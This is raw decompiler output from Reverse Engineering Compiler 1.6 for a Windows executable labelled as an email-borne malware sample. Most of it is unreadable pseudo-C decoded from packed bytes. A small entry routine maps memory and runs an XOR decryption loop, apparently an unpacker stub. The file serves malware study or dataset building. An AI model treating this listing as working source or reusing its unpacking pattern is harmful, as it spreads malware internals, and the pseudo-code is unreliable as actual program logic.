/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0048/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 0040143a -> 004013dc */
/* DEST BLOCK NOT FOUND: 0040145a -> 004014d8 */
/*	Procedure: 0x00401430 - 0x004014A0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401430()
{



    asm("%g pop es");
    goto L004013dc;
    esp = esp >> 1;
    dh = dh + bl;
    ch = 92;
    goto L004013dc;
    asm("out 0xf4,eax");
    ecx = ecx * edx;
    (restore)edi;
    esi = eax;
    ecx = ecx - 1;
    asm("out dx,al");
    ecx = -372975477;
    bh = bh + bl;
    *eax = *eax - 284117983;
    (save)eax;
    if(eax = eax + -95984807) {
        goto L004014d8;
    }
    asm("wait");
    asm("cmc");
    ecx = eax;
    (restore)esi;
    asm("out dx,al");
    edi = edi - 1;
    esp = esp + *(edi + 33);
    esp = *(esi + esi - 2) & 65535;
    asm("Unknown opcode 0xc1");
    if(!( *edi & 3)) {
        asm("out dx,al");
        (restore)ecx;
L00401473:
        if((ebp = ebp - eax) || (ebp = ebp + ecx)) {
            goto L004014d5;
        }
        edx = edx ^ eax;
    }
    asm("out dx,al");
    (save)esi;
    esp = esp + ebx;
    asm("xchg eax,edi");
    asm("lodsd");
    (save)esi;
    asm("popf");
    *ebx = *ebx ^ eax;
    goto L00401498;
    asm("xchg eax,esp");
    goto L004014d5;
    esi :: esi;
    esi = esi - *(edi + 48);
    asm("aam 0xee");
    goto L00401473;
    asm("%g mov ebx,edx");
L00401498:
    asm("adc edx,[edi+0x3c]");
    ebp = *(edx + 125);
    edi = edi + ebx;
    asm("sti");
}

/* DEST BLOCK NOT FOUND: 004014a6 -> 00401489 */
/* DEST BLOCK NOT FOUND: 004014b3 -> 8bf4fab8 */
/* DEST BLOCK NOT FOUND: 004014d3 -> 00401463 */
/*	Procedure: 0x004014A1 - 0x004015F7
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004014A1(Ac)
/* unknown */ void  Ac;
{



    bl = 226;
L004014a2:
    (fsave)(frestore) * *(edi + 90);
    goto L00401489;
    if(!( *(ebx + 2) = *(ebx + 2) - dl)) {
        (save)esp;
        ecx = 0;
        asm("sti");
        cl = cl | al;
        goto L8bf4fab8;
    }
    (restore)edi;
    asm("sbb eax,0xee30778b");
    *(ecx + 91) = *(ecx + 91) + cl;
    (al >> 39) + *(al >> 39) :: edx;
    asm("Unknown opcode 0x64");
    asm("Unknown opcode 0xc7");
    goto L004014a2;
    asm("adc esi,esi");
    asm("lodsd");
    edx = edx + ebx;
    (restore)esp;
    (restore)edi;
    goto L00401463;
    Ac = es;
    asm("%f ret");
    asm("loopne 0x4014cc");
    asm("adc [eax+edx],cl");
    (save)eax;
    asm("std");
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    (restore)edi;
    goto L00401515;
    (restore)ds;
    dl = 80;
    asm("adc al,0x9d");
    if(!(eax = eax + -84348710)) {
        asm("sbb [edi],bl");
    }
    dl = 80;
    (save)es;
    asm("xchg eax,ebx");
    goto L00401523;
    edx = edx + 1;
    asm("wait");
    ebp = ebp + 1;
    (save)eax;
    (save)edx;
    *edi = al;
    edi = edi + 1;
    (restore)es;
    *eax = *eax + al;
    asm("adc dh,ch");
    asm("sbb ebp,ebx");
    eax = *(ecx + *(esi + 158042891) + 44);
    (save)es;
    ebx = ebx >> 199;
L00401515:
    asm("xchg al,dh");
    *(edx + 112) = *(edx + 112) - bl;
    ebx = ebx + eax;
    edx = edx + 1;
    asm("in eax,dx");
    *eax :: eax;
    asm("adc [0x83afeb91],al");
L00401523:
    asm("out 0xaf,al");
    asm("out dx,eax");
    asm("adc [eax+0x10],dh");
    (save)eax;
    *ebx = *ebx | eax + 1134254492;
    asm("sbb ebp,esi");
    L0040163E();
    asm("Unknown opcode 0xd3");
    if(!(esp = esp + 1)) {
        edx = 1298;
        eax & 268435493;
        al = *esi;
        esi = esi + 1;
        *eax = *eax + al;
        asm("adc [0xeec1450f],ah");
        asm("sbb al,0xf");
        (save)ebp;
        asm("aam 0x8b");
    }
    esi = esi - 1;
    asm("sbb al,0xee");
    asm("aad 0x8b");
    (save)esi;
    *LA0051000 = *LA0051000 & esp;
    edx = 1360;
L00401568:
    eax = eax - -1342177275;
    asm("out dx,al");
    asm("into");
    ecx = 1300;
    ecx = -1879048187;
    asm("out dx,al");
    (fsave)(frestore) + *(ebp + 1178864336);
    dh = dh + ch;
    ah = 160;
    asm("out dx,eax");
    asm("adc [eax+edx],ah");
    (save)eax;
    asm("jpo 0x40156c");
    al = 196;
    goto L0000bb32;
L00401599:
    ebp = 84934665;
    goto L004015ba;
    if(eax = eax + 2057924638) {
        goto L00401568;
    }
    asm("pusha");
    asm("Unknown opcode 0x8e");
    asm("Unknown opcode 0xfe");
    ebx = -2022876665;
    asm("sti");
    asm("Unknown opcode 0xdb");
    eax = eax ^ ebx;
    asm("xchg eax,ebx");
    asm("out dx,eax");
    *(ebx + 158717845) = *(ebx + 158717845) + ebp;
    asm("sti");
    asm("jecxz 0x401605");
L004015ba:
    ebx = ebx - eax;
    al = al - 76;
L004015be:
    al = al & 48;
    es = *edi;
    goto L004015be;
    asm("xchg al,[esp+0x30]");
    *(eax + 2147160064) = *(eax + 2147160064) + edi;
    ebx = *(eax + 268436261);
    (save)es;
    *(ebx + -910292457) = *(ebx + -910292457) | cl;
    al = (eax & esi ^ ecx) & 72;
    goto L00401599;
    asm("out dx,eax");
    asm("adc [eax+edx+0x50],ch");
    eax = eax + 1080737146;
    (save)12288;
    ebp = ecx;
    (save)edi;
    (save)0;
}

/* DEST BLOCK NOT FOUND: 004015f8 -> 00401612 */
/* DEST BLOCK NOT FOUND: 00401605 -> 00401637 */
/*	Procedure: 0x004015F8 - 0x004015F9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004015F8()
{



    goto L00401612;
}

/* DEST BLOCK NOT FOUND: 00401618 -> 0040164b */
/* DEST BLOCK NOT FOUND: 00401641 -> 004015ec */
/*	Procedure: 0x004015FA - 0x0040163D
 *	Argument size: 20
 *	Local size: 0
 *	Save regs size: 0
 */

L004015FA(A8, A18)
/* unknown */ void  A8;
/* unknown */ void  A18;
{



    asm("pusha");
    edi = 2244;
    esi = 0x40129c;
    goto L00401637;
L00401607:
    asm("loop 0x401631");
    ecx = __imp__VirtualFree;
    asm("popa");
    goto L0040161a;
    A8 = *ecx();
    goto L0040164b;
L0040161a:
    ebp = ebp + 276;
    (save)-224;
    *esp = *esp + ebp;
    edx = 4194304;
    goto L00401643;
    ecx = ecx + 1;
    asm("lodsd");
    eax = eax ^ ebx;
    *edi = eax;
    edi = edi + 4;
    goto L00401607;
L00401637:
    A18 = __imp__VirtualAlloc;
}

/* DEST BLOCK NOT FOUND: 00401641 -> 004015ec */
/* DEST BLOCK NOT FOUND: 00401649 -> 00401630 */
/*	Procedure: 0x0040163E - 0x0040165C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040163E()
{



    esp = esp - 1;
    al = al & 24;
    goto L004015ec;
    return;
L00401644:
    edi = eax;
    ecx = ecx >> 2;
    goto L00401630;
    ecx = edi;
    ebx = 1296;
    goto L00401644;
    *__imp__EnterCriticalSection();
    asm("retf 0xef11");
}

/* DEST BLOCK NOT FOUND: 004017a6 -> c18d98f7 */
stack space not deallocated on return
/*	Procedure: 0x0040165D - 0x0040195F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040165D()
{



    asm("adc [eax+edx+0x50],cl");
    eax = eax + 91889042;
    eax = *ecx();
    asm("Unknown opcode 0xc6");
    eax = *L0040152c();
    asm("sti");
    if(!( *(edx + 64) = *(edx + 64) | ch)) {
        *eax = *eax ^ al;
        asm("adc [ebp-0x75],dl");
    }
    ebx = ebx - 1;
    asm("sbb al,0xee");
L0040167e:
    asm("in eax,0xc3");
    asm("out dx,eax");
    asm("adc [eax+edx+0x50],ah");
L0040168a:
    (save)ebx;
    goto L004016b9;
    (save)edi;
    (save)331776;
    goto L004016c0;
    if(eax = eax + -968209133) {
        goto L0040168a;
    }
    eax = -2022876659;
L00401698:
    asm("sti");
    asm("adc edi,[ecx+0x8771291a]");
L0040169e:
    (save)31471;
    >= ? 0x4016f7 : ;
    al = *esi;
    esi = esi + 1;
    ebp = ebp + *(ebx + -1089483978);
    asm("Unknown opcode 0xc4");
    goto L004016b9;
    asm("adc eax,edi");
    eax = eax - 1;
    goto L00401698;
L004016b9:
    (restore)esp;
    ecx = ecx ^ ebx;
    asm("adc eax,esp");
    eax = eax >> 0;
L004016c0:
    (restore)esp;
    eax = eax & ecx;
L004016c3:
    ecx = ecx - 1;
    (restore)esi;
    (restore)edx;
    return;
    ecx = ecx + 1;
    esi = -2105712873;
    goto L0040169e;
    edx = edx - 1;
    asm("adc dl,0xeb");
    *(edx - 26) = *(edx - 26) << 1;
    asm("adc ebp,edi");
    asm("adc [eax+0x10],bh");
    (save)eax;
    eax = eax + 224668615;
    ecx = ecx - 66832;
    asm("sti");
    ecx = ecx | *(ebx + 1393884113);
    if(ecx = *(ebx + 9) & -64240) {
        goto L0040167e;
    }
    asm("out dx,al");
    asm("loope 0x4016b8");
    if(*(ebp + 74) >= ecx) {
        goto L004016c3;
    }
    == ? L004016eb : ;
    asm("clc");
    ebp = edi;
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    *ebx = es;
    goto L00401727;
    asm("in eax,dx");
    ebp :: -17;
    asm("cli");
    *ebx = eax;
    (restore)esi;
    return;
    *(ebx + 1) = edx;
    eax = 382901618;
    goto L00401727;
    *(ebx + 12) = es;
    al & 119;
    (restore)ebp;
L00401727:
    (restore)edx;
    ch :: dh;
    asm("loop 0x4016e4");
    *%fs:eax+esi*2] = *%fs:eax+esi*2] | ah;
    asm("clc");
    asm("%g std");
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    asm("out dx,al");
    asm("loopne 0x401720");
    ecx = ecx - 1;
    asm("clc");
    asm("Unknown opcode 0xff");
    eax = *(ecx + 1656227910)();
    (restore)ss;
    eax = eax - edi;
    asm("clc");
    ecx = ecx - 1;
    asm("std");
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    asm("out dx,al");
    asm("salc");
    asm("jpo 0x40173c");
    asm("adc [eax+0x10],cl");
    (save)eax;
    eax = eax + -968254830;
    (save)ecx;
    ebx = *(ebx + 13);
    ecx = *(ecx + 44);
    asm("in eax,dx");
    eax = eax & *eax;
    asm("adc [0x10eff0eb],al");
    (save)esp;
    asm("adc [eax+0x5],dl");
    asm("xchg eax,ebp");
    asm("xlatb");
    if(*edx == dl) {
        eax = L0000e1c6();
    }
    asm("repne out dx,eax");
    asm("adc [eax],ah");
    asm("adc [eax+0x5],dl");
    asm("out dx,eax");
    ebp = ebp + 1;
    (save)eax;
    asm("repne jmp 0x3397eae1");
    bh = bh << cl;
    asm("hlt");
    asm("%f imul bl");
    asm("lock shl dword [ebp-0x75],cl");
    (save)ebx;
L00401794:
    asm("sbb [esi+0x69b504a],cl");
    edx = 331840;
    eax = L004015F8();
    if(edx >= 0) {
        goto L00401794;
    }
    goto Lc18d98f7;
    asm("loopne 0x4017c5");
    asm("sti");
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    asm("Unknown opcode 0xc6");
    asm("%s cli");
    asm("adc esi,esi");
    eax = L0045283c();
    (restore)ebx;
    ebp = ebp >> cl;
    if(!(eax & 1492699443)) {
    }
    asm("adc [0x97ac49be],al");
    >= ? 0x401785 : ;
    == ? L004017d3 : ;
    *eax = *eax + al;
    asm("sti");
    eax = eax | 1510456316;
    asm("insd");
    asm("xchg edi,ebx");
    (save)cs;
    esi = esi + ebx;
    asm("rep pop ss");
    eax = L0045283c();
    goto L00401800;
    (save)es;
    asm("fnstcw [ecx+0x709]");
    asm("wait");
    asm("std");
    goto L00401803;
    eax & 268438362;
    ebx = 2105722089;
    asm("jecxz 0x4017bf");
    asm("sti");
    edi = -297596021;
L00401800:
    asm("iret");
L00401803:
    esi = 2022880377;
    asm("rep mov ecx,0xb6fbf303");
    ch = 234;
    asm("rep cmp [ebx],ch");
    edx = edx + 1;
    asm("sbb dh,ch");
    asm("sbb ah,bh");
    eax = eax & ebp;
    ebx = -2023207145;
    eax = esp;
    *(edx + 4) = es;
    asm("cdq");
    edi = edi + 1;
    *(eax - 47) = *(eax - 47) | ch;
    asm("wait");
    asm("adc al,0xd9");
    eax = eax - 1;
    asm("out dx,al");
    asm("adc esi,[esi-0x15]");
    al = al + 66;
    *ebx = *ebx | dl;
    asm("cmc");
    ecx = ecx - eax;
    asm("%g imul ebx");
    asm("adc eax,[ebx-0x7a]");
    asm("in al,dx");
    asm("adc al,0xfb");
    al = al >> 1;
    esi = esi + 1;
    asm("out dx,al");
    asm("cli");
    eax = *(eax - 8)();
    asm("aad 0x0");
    asm("out dx,al");
    asm("rol dword [ebx+0xc35b1dd4],0x93");
    asm("std");
    if(!( *eax = *eax + dl)) {
        < ? L0040189e : ;
        goto L004018c4;
L0040185c:
        esp = 2088036564;
        asm("out dx,al");
        asm("adc al,0xfa");
        asm("Unknown opcode 0xff");
        goto ( *(ebx + 109));
        eax = 0;
        asm("clc");
        asm("Unknown opcode 0xfe");
        asm("Unknown opcode 0xfe");
        asm("Unknown opcode 0xff");
        asm("out dx,eax");
        if(ebp <= eax) {
            goto L0040185c;
        }
        goto L004018c6;
        <= ? L00401894 : ;
        ebx = ebx ^ ecx;
        asm("out dx,al");
        eax = Lc9764df4();
        goto L0040189a;
        <= ? L00401859 : ;
        >= ? L004018c4 : ;
        asm("sti");
        asm("iret");
        eax = L003b0312();
        goto L004018b8;
        asm("out dx,al");
        (restore)ebp;
        (save)eax;
        ch = ch + 182;
        bl = bl >> 255;
L0040189a:
        asm("Unknown opcode 0xff");
        asm("sti");
        asm("rcl byte [ebx],cl");
        esp = ebp;
        (restore)ebp;
        asm("sti");
        dl = 232;
        edi = edi + ebp;
        asm("cli");
        asm("Unknown opcode 0xff");
        asm("sti");
        asm("salc");
L004018ae:
        asm("adc al,al");
        asm("arpl [esi],cx");
        if(eax != 30736) {
            goto L004018de;
        }
        asm("sti");
        asm("sbb al,0x83");
        asm("rcl dword [ecx],0xb5");
L004018b8:
        asm("adc [ebx+0xfeaaed12],dh");
        asm("out dx,eax");
        asm("cli");
        goto L004018ae;
L004018c4:
        (save)ecx;
        *esp = es;
L004018c6:
        eax = eax - 1;
        asm("out dx,al");
        asm("adc bl,ch");
        asm("ficomp dword [ebx+eax*8-0x56]");
    }
    asm("sti");
    al = al >> 59;
    goto L0000a0ee;
L004018db:
    (save)eax;
    *LEADDE804 = eax;
L004018de:
    asm("cli");
    asm("Unknown opcode 0xff");
    goto L004018db;
    bl = 31;
    ebp = ebp - 1;
    edx = edx + 1;
    asm("repne loope 0x4018a5");
    asm("arpl [edx+0x6d],bx");
    asm("xchg esp,[ebx]");
    asm("into");
    ecx = ecx / ecx;
    edx = ecx % ecx;
    asm("sti");
    (save)cs;
    ecx = ecx / ecx;
    edx = ecx % ecx;
    (restore)edi;
    asm("insd");
    asm("xchg eax,edi");
    asm("%s ret");
    goto L0040193a;
    (restore)edi;
    (restore)ecx;
    return;
    asm("jecxz 0x4018a7");
    ecx = -2023207118;
    ebx = 0;
    es = *(edx + 4);
    asm("sti");
    asm("Unknown opcode 0xd3");
    if(!(al & 20)) {
        asm("adc eax,esp");
        ecx = 0;
    }
    ecx = ecx + 1;
    asm("Unknown opcode 0x8e");
    asm("enter 0xf7eb,0x57");
    (save)ecx;
    eax = eax ^ edx;
    esp = -2105712867;
    ecx = ecx ^ ebx;
    asm("sti");
    esp = ebp;
    (restore)ebp;
L0040192a:
    eax = eax + edx;
L0040192c:
    ecx = ecx - 1;
    (restore)edi;
    asm("%c enter 0xcdeb,0xae");
    if(*(edx + 20) = *(edx + 20) + eax) {
        goto L0040192c;
    }
    edx = edx >> cl;
L0040193a:
    asm("adc eax,0x450044");
    return;
    ebx = ebx + 1;
    ds = *(ebx + 12);
    eax = eax + 1;
    asm("cli");
    asm("adc ebx,[ebx-0x5]");
    goto L0040192a;
    -58 = ebx * edx;
    (save)ecx;
    ebx = *(ebx + 13);
    ecx = *(ecx + 40);
    asm("in eax,dx");
    edi = edi - esi;
    asm("out dx,eax");
    asm("cli");
    (restore)ecx;
    goto ( *(ebp + 1442810829));
}

/*	Procedure: 0x00401960 - 0x004019AF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)0;
    (save)16384;
    (save)0;
    (save)4;
    (save)0;
    (save)-1;
    eax = *__imp__CreateFileMappingA();
    if(eax != 0) {
        (save)eax;
        *__imp__GetCurrentProcessId();
        (restore)eax;
        (save)0;
        (save)0;
        (save)0;
        (save)6;
        (save)eax;
        eax = *__imp__MapViewOfFile();
        if(eax != 0) {
            return(L004019B0(eax));
            (restore)eax;
            L004015FA();
            eax = 0;
        }
    }
}

/*	Procedure: 0x004019B0 - 0x004019D9
 *	Argument size: -24
 *	Local size: 28
 *	Save regs size: 0
 */

L004019B0(A8, A28)
/* unknown */ void  A8;
/* unknown */ void  A28;
{



    *__imp__VirtualQuery(A8, esp, 28);
    eax = A28 >> 12;
    ecx = eax - 1;
    *(esp + eax) = *(esp + eax) + eax;
}

/* DEST BLOCK NOT FOUND: 00401a4e -> 8b7d1555 */
/*	Procedure: 0x004019DA - 0x00401AB0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004019DA()
{



    asm("rol byte [ecx],1");
    asm("adc eax,[ebx+0xc]");
    eax = L00401430();
    asm("wait");
    asm("jpo 0x4019f7");
    goto L00401a47;
    asm("scasb");
    *edi :: 16;
    asm("out dx,al");
    ebp = ebp | ebx;
    esi + eax :: 0;
    *%fs:ebx] = *%fs:ebx] + 1;
    edi = edi ^ ebx;
    eax = eax | -2041692299;
    asm("Unknown opcode 0xc6");
    asm("adc al,0xfb");
    L05409889();
    eax = *ebx;
    asm("%f loop 0x4019f6");
    asm("rcr byte [ebx+0x1548dc3],1");
    (restore)es;
    ecx & -2147482352;
    (restore)ds;
    ecx = ecx + 1;
    asm("retf 0x89e8");
    eax = eax + -1023737856;
    esi = *ebx;
    asm("adc esi,[ebx+0x3c]");
    ebx = *(esi + 268435585);
    asm("Unknown opcode 0x8e");
    dh = 128;
    asm("adc [0xeeace300],al");
    eax = *L963E1356;
    asm("Unknown opcode 0x8e");
    asm("por mm3,mm3");
    (restore)edi;
    (save)cs;
    eax = eax | -336425343;
L00401a47:
    (restore)esi;
L00401a49:
    asm("Unknown opcode 0x8e");
    asm("enter 0xd033,0xc4");
    goto L8b7d1555;
    ebx = ebx - 1;
    asm("sbb [esi+0xa410473],cl");
    bh = 65;
    al = al + 142;
    ecx :: *(ebp + -1961360300);
    (restore)ecx;
    (save)ecx;
    asm("pusha");
    edx = ecx;
    asm("in eax,dx");
    asm("loopne 0x401a6a");
    asm("out dx,eax");
    asm("cli");
    goto L00401a49;
    asm("clc");
    asm("xchg eax,ecx");
    asm("cli");
L00401a73:
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    asm("xchg eax,ebp");
    eax = *(ebx + 20);
    asm("in eax,dx");
    (save)ecx;
    *eax = *eax + dl;
    *(eax + -85410584 + -25352)();
    asm("out dx,eax");
    asm("out dx,al");
    asm("in eax,0xf3");
    bh = 1235546980 | *(edi + -1376905647);
    asm("Unknown opcode 0xc1");
    *esi & 193;
    asm("loop 0x401ab2");
    *(edx + esi) = dl;
    asm("adc edx,esp");
    L003b03e3();
    goto L00401a73;
    asm("enter 0x54a2,0x1f");
    edi = edi + 1;
    asm("retf 0x9b51");
}

/*	Procedure: 0x00401AB1 - 0x00401AB1
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401AB1()
{



    (save)esi;
}

/*	Procedure: 0x00401AB2 - 0x00401AC2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401AB2()
{



    al = al | 80;
    asm("out dx,eax");
    (save)edi;
    al = al + 235;
    asm("sbb [edx],ecx");
    bh = 209;
    (restore)ds;
    edi = -268754975;
}

/* DEST BLOCK NOT FOUND: 00401bbe -> 00401c03 */
/*	Procedure: 0x00401AC3 - 0x00401BC3
 *	Argument size: -6158
 *	Local size: 0
 *	Save regs size: 0
 */

L00401AC3()
{



    esi = esi - 1;
L00401ac4:
    asm("out dx,eax");
    (save)edi;
    bl = bl | al;
    asm("out dx,eax");
    asm("adc [eax+0x10],bl");
    (save)eax;
    eax = eax + -2062522173;
    *eax = *eax + al;
    asm("jpe 0x401adb");
    edx = *(ebx + 28);
    (save)ebp;
    goto L00401ac4;
L00401adc:
    asm("out dx,eax");
    (restore)ss;
    (restore)eax;
    return;
    asm("jpe 0x401ae7");
    edx = *(ebx + 28);
    (save)ebp;
    goto L00401adc;
    asm("jpe 0x401aef");
    (save)esp;
    (save)ecx;
    asm("sti");
    asm("Unknown opcode 0xf7");
    al = al | 159;
    asm("wait");
    asm("int 0x8b");
L00401af2:
    (save)cs;
    ebx & esi;
    asm("out dx,al");
    al = al + 86;
    edx = edx + 1;
    asm("out dx,al");
    asm("adc edi,[ecx+0x518]");
    *%fs:ebx+0x75] = *%fs:ebx+0x75] & ecx;
    eax = eax ^ 1314528238;
    (restore) *(esi + 2);
    asm("sti");
    dl = dl - *(ebx - 117);
    esp = ebp;
    (restore)ebp;
    edi = -1005734144;
    eax = 0;
L00401b1b:
    asm("sti");
    asm("xlatb");
    cl = 23;
    ebp = ebp << 115;
    asm("sbb bl,bh");
    asm("adc [edx+0x84f1fbc3],ecx");
    *(ebp + esi * 8 - 47) = *(ebp + esi * 8 - 47) << 224;
    asm("arpl [edi],ax");
    eax = eax ^ edx;
    asm("repne std");
    goto L00401af2;
    asm("sti");
    asm("loope 0x401b6e");
    return;
    (restore)ebx;
    goto L00401b1b;
    bl = 237;
    asm("clc");
    edi = edi - 1;
    asm("std");
    asm("Unknown opcode 0xff");
    asm("out dx,eax");
    asm("%c cmp al,0x24");
    asm("Unknown opcode 0x8c");
    if(!(eax = eax - 1)) {
        goto L00401b5d;
        if(al = al | 100) {
            goto L00401ba8;
        }
        asm("cld");
        dl = 144;
        asm("%s fucomi st3");
        *(edx + -1619082249) & 2026147886;
L00401b5d:
        *(al + *eax + 68) = *(al + *eax + 68) + ch;
        *(ecx + 109) = edi;
        ah = 2;
        asm("lds esi,[0xaee0de77]");
    }
    *eax = *eax + al;
    *eax = *eax + al;
    *(ebx + -513807756) = *(ebx + -513807756) + dl;
    (restore)eax;
    if(!(dl = dl + *edi)) {
        *eax = *eax + al;
        *eax = *eax & ah;
        ebp = ebp + esi;
        asm("loop 0x401b78");
        (restore)edi;
        asm("xchg al,[eax+0x400d8]");
    }
    asm("sbb dl,[ecx+0x89e6cc7]");
    esp = ebp;
    (restore)ebp;
    (save)esi;
    (restore)es;
    *(al | 194) = *(al | 194) | al | 194;
    *(edi - 95) = *(edi - 95) + bh;
    asm("outsb");
    asm("rcr byte [ecx+0x20],0x8b");
L00401ba8:
    asm("adc al,0x12");
    asm("adc [eax],al");
    *(ecx + -685896445) = *(ecx + -685896445) + dl;
    asm("%g insb");
    asm("enter 0x0,0x0");
    if(esp = esp & *(eax - 113)) {
        goto L00401c03;
    }
    asm("sbb [eax+0x14],dl");
    asm("rcl dword [eax+0x14],cl");
}

/* address  size  */
/* 0x00400023       0 */ /* unknown */ void 	__imp__Ý(;
/* 0x00400127       0 */ /* unknown */ void 	__imp__;
/* 0x00400153       0 */ /* unknown */ void 	__imp__;
/* 0x00401000       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00401004       0 */ /* unknown */ void 	__imp__HeapSetInformation;
/* 0x00401008       0 */ /* unknown */ void 	__imp__CreateFileMappingA;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__lstrcpynA;
/* 0x00401010       0 */ /* unknown */ void 	__imp__FileTimeToSystemTime;
/* 0x00401014       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x00401018       0 */ /* unknown */ void 	__imp__HeapDestroy;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__MapViewOfFile;
/* 0x00401020       0 */ /* unknown */ void 	__imp__SetFilePointerEx;
/* 0x00401024       0 */ /* unknown */ void 	__imp__SetLastError;
/* 0x00401028       0 */ /* unknown */ void 	__imp__SetFilePointer;
/* 0x0040102c       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x00401030       0 */ /* unknown */ void 	__imp__GetFileTime;
/* 0x00401034       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x00401038       0 */ /* unknown */ void 	__imp__GetCurrentProcessId;
/* 0x0040103c       0 */ /* unknown */ void 	__imp__UnmapViewOfFile;
/* 0x00401040       0 */ /* unknown */ void 	__imp__HeapSummary;
/* 0x00401044       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00401048       0 */ /* unknown */ void 	__imp__DeleteCriticalSection;
/* 0x0040104c       0 */ /* unknown */ void 	__imp__LeaveCriticalSection;
/* 0x00401050       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x00401054       0 */ /* unknown */ void 	__imp__GetFileAttributesExA;
/* 0x00401058       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x0040105c       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x00401060       0 */ /* unknown */ void 	__imp__VirtualQuery;
/* 0x00401064       0 */ /* unknown */ void 	__imp__HeapUnlock;
/* 0x00401068       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x0040106c       0 */ /* unknown */ void 	__imp__InitializeCriticalSection;
/* 0x00401070       0 */ /* unknown */ void 	__imp__ReadFileScatter;
/* 0x00401074       0 */ /* unknown */ void 	__imp__EnterCriticalSection;
/* 0x00401078       0 */ /* unknown */ void 	__imp__TryEnterCriticalSection;
/* 0x00401960       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
